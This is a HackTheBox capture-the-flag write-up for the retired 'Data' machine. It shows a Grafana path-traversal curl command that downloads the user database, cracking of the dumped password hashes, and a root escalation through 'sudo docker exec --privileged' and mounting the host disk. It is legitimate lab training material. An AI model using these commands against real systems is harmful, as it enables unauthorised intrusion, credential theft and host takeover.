---
title: 'HTB | Data'
published: 2026-07-08
draft: false
description: 'HTB Retired Machine `Data` writeup.'
tags: ['HackTheBox', 'linux']
---

## Recon

### Port Scan
```
# Nmap 7.95 scan initiated Sun Jul  5 12:50:21 2026 as: nmap -sC -sV -p22,3000 -Pn -n -vv -oN nmap/tcp_deep 10.129.12.79
Nmap scan report for 10.129.12.79
Host is up, received user-set (0.077s latency).
Scanned at 2026-07-05 12:50:22 EDT for 18s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzybAIIzY81HLoecDz49RqTD3AAysgQcxH3XoCwJreIo17nJDB1gdyHYQERGigDVgG9hz9uB4AzJc87WXGi7TUM0r16XTLwtEX7MoMgmsXKJX/EoZGQsb1zyFnwQR00xsX2mDvHpaDeUh3EtsL1zAgxLSgi/uym4nLwjTHqpTmm0shwDqlpOvKBbL7IcQ3vVKkmy7o7TG7HYMHiDYF+Aw5BKnOTuVoMgGy3gaFXJqyhszV/6BD9UQALdrtAXKO3bO4D6g5gM9N78Om7kwRvEW3NDwvk5w+gA6wDFpMAigccCaP/JuEPoeqgV3r6cL4PovbbZkxQScY+9SuOGb78EjR
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGUqvSE3W1c40BBItjgG3RCCbsMNpcqRV0DbxMh3qruh0nsNdNm9QuTflzkzqj0nxPoAmjUqq0SolF0UFHqtmEc=
|   256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPDOwcGGuUmX8fQkvfAdnPuw9tMrPSs4nai8+KMFzpvf
3000/tcp open  http    syn-ack Grafana http
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: C308E3090C62A6425B30B4C38883196B
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Grafana
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul  5 12:50:40 2026 -- 1 IP address (1 host up) scanned in 18.50 seconds

```

- Nmap shows 2 ports open : 22 (SSH) and 3000 (Granfana Instance)
### Grafana Instance @3000
Footprinting the application : 
- Grafana version 8.0.0, specific commit `41f0542c1e`
- Default credentials of `admin / admin` do not work
- This commit of grafana is vulnerable to an **Unauthenticated Arbitrary File Read** vulnerability. 
## Exploitation
- Reading `passwd` file and looking for users with shell access only returns `root` user, this indicates that grafana is running inside from a container.
	- The other user is `grafana`, and I do not have access to any ssh keys for this user.
- Reading `/etc/grafana/grafana.ini` file, which is the default grafana config file.
	- It stores DB credentials, and path to the database directory.
	- Grafana uses a sqlite3 database, with a default name of `grafana.db`. Its location mentioned is `/var/lib/grafana/grafana.db` 
	- I can easily request and download this file.
```shell
$ curl http://10.129.12.79:3000/public/plugins/mysql/../../../../../../../../../../../var/lib/grafana/grafana.db --path-as-is -o grafana.db -s
```
### Cracking user credentials
- The creds for grafana users are stored inside the `user` table in the sqlite db.
```shell
$ sqlite3 grafana.db

sqlite> .mode columns
sqlite> .headers on
sqlite> select login,password,salt from user;
login  password                                                      salt      
-----  ------------------------------------------------------------  ----------
admin  7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131  YObSoLj55S
       322cf3723c92164b6172e9e73faf7a4c2072f8f8                                

boris  dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e  LCBhdtJWjl
       5cd39d156be220745be3cbe49353e35f53b51da8 
```

- Grafana has a different `salt` for each user, so if 2 users have same password, their hashes will differ, which is helpful in prevent **rainbow table attacks**.
- Each password hash is 100 chars long.
- I can use a script like `grafana2hashcat.py` to convert these hashes to hashcat format (`-m 10900`)
- After converting, I can only crack `boris` user's password.
- I login to the app, but found nothing interesting. Nor there is any other CVE that can give me code execution now that I am authenticated.
### SSH Login as `Boris`
- I tried this set of credentials to login with ssh on the box, and they work. I have shell access as `boris`, and can read the user flag.
## Privilege Escalation
### `docker exec *`
- As `boris` , I had access to run `docker exec` as root with a `wildcard (*)` number of flags. This is exactly what enabled the privilege escalation
- First, I need container ID. Since, I can read any file on the container, I read `/etc/hostname` which is the container ID.
- Another method to get container ID is to check running processes.
```shell
boris@data:~$ ps auxww | grep docker
<SNIP>
root      1517  0.0  0.4 712608  8140 ?        Sl   01:16   0:02 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock
<SNIP>
```
- Either way, I now have an ID and now can run any command inside the container. 
- Any command I run, is being executed as `grafana` user.

### Exploiting wildcard flags
- `docker exec` has the following flags : 
```shell
boris@data:~$ docker exec --help

Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]

Run a command in a running container

Options:
  -d, --detach               Detached mode: run command in the background
      --detach-keys string   Override the key sequence for detaching a container
  -e, --env list             Set environment variables
      --env-file list        Read in a file of environment variables
  -i, --interactive          Keep STDIN open even if not attached
      --privileged           Give extended privileges to the command
  -t, --tty                  Allocate a pseudo-TTY
  -u, --user string          Username or UID (format: <name|uid>[:<group|gid>])
  -w, --workdir string       Working directory inside the container
```

- Among these, `--privileged` and `--user` are the most critical.
- `--user root` argument will run any command as `root` user inside the container.
- `--privileged` argument disables most of Docker's security restrictions (`seccomp`, `AppArmor/SELinux`, `capability dropping`) and gives the container access to all host devices.
	- Basically, if I have this flag enabled, I can mount the host system inside the container.
- I execute `bash` inside the container as `root` with the `--privileged` flag, and now I can mount the host file system.
```shell
boris@data:~$ sudo /snap/bin/docker exec --user root --privileged -it e6ff5b1cbc85 bash
bash-5.1# mount /dev/sda1 /mnt/
bash-5.1# ls /mnt/
bin             etc             initrd.img.old  lost+found      opt             run             srv             usr             vmlinuz.old
boot            home            lib             media           proc            sbin            sys             var
dev             initrd.img      lib64           mnt             root            snap            tmp             vmlinuz
```
- From here, I can read the root flag.
